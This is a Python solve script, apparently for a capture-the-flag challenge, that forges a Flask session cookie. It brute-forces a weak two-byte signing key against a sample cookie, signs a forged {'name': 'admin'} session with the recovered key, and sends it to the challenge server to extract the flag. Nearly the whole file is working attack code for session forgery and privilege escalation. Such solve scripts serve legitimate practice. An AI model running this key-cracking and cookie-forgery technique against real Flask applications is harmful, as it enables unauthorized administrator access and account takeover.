from string import ascii_lowercase
from random import seed, randbytes, choice
import requests
import os
import subprocess
from itsdangerous import base64_decode
from flask.sessions import SecureCookieSessionInterface

# import HTMLParser

# $ python{2,3} flask_session_cookie_manager{2,3}.py encode -s '.{y]tR&sp&77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d' -t '{"number":"326410031505","username":"admin"}'
DUMMY_COOKIE = "eyJuYW1lIjoiam9lIn0.Y2WdYA.Ka04FYZz1snwMH7WJatfGm4VuTI"

obtained_secret = "7h15_5h0uld_b3_r34lly_53cur3d"


def generate_random_key():
    key = randbytes(1)
    key += choice(ascii_lowercase).encode("ascii")
    return key


class FlaskMockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key


def session_cookie_encoder(key, session_cookie_structure):
    try:
        app = FlaskMockApp(key)
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)

        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error]{}".format(e)


# print(session_cookie_encoder({"name": "admin"}))


def sendReq(cookie):
    cookies = {"session": cookie}
    r = requests.get("https://flasksessions.io.ept.gg/", cookies=cookies)
    # print(r.text)
    t = r.text
    a = r.text[r.text.find("<code>") + len("<code>") : r.text.find("</code>")]
    # print(r.text.find("Flag:"))
    # print(a)
    return a
    # print(r.text[10:20])


secret = DUMMY_COOKIE.split(".")[-1]

# for x in range(256):
#     for a in ascii_lowercase:
#         key = x.to_bytes(1, "big")
#         key += a.encode("ascii")
#         print(key)
#         print(len(key))
#         cookie = session_cookie_encoder(key, {"name": "admin"})
#         print(cookie)
#         print(DUMMY_COOKIE)
#         if cookie.split(".")[-1] == secret:
#             print(cookie)
#             print(cookie)
#             print("JOE")
#             exit()
# req = sendReq(cookie)
# print(cookie)
# if "Flag: " in req:
#     print(req)
#     exit()

secret = b"\x13x"
cookie = session_cookie_encoder(secret, {"name": "admin"})
req = sendReq(cookie)
print(req)

# print(DUMMY_COOKIE)
# cookie = session_cookie_encoder({"name": "admin"})
# req = sendReq(cookie)
# i = 0
# while "Flag:" not in req:
#     cookie = session_cookie_encoder({"name": "admin"})
#     print(cookie)
#     req = sendReq(cookie)
#     i += 1
#     print(i)
#     # print(req)

# print(req)


# genCommand()
# req = sendReq(DUMMY_COOKIE)


# sendReq(DUMMY_COOKIE)
